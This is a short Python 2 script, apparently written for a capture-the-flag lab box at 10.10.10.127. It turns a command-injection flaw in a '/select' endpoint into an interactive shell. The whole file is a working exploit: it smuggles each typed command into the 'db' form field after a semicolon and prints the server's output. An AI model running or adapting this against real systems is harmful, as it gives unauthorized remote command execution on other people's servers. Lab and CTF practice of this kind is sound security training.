#!/usr/bin/python
import requests
from bs4 import BeautifulSoup
from sys import exit

def rce():
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    try:
        while True:
            cmd = raw_input("$ ")
            data = 'db=;{}'.format(cmd)
            html = requests.post('http://10.10.10.127/select', headers=headers, data=data, verify=False).text
            soup = BeautifulSoup(html,"lxml")
            out = soup.find('pre').text

            print out.replace('\n\n', '\n')
    except:
        exit()

if __name__ == '__main__':
	rce()
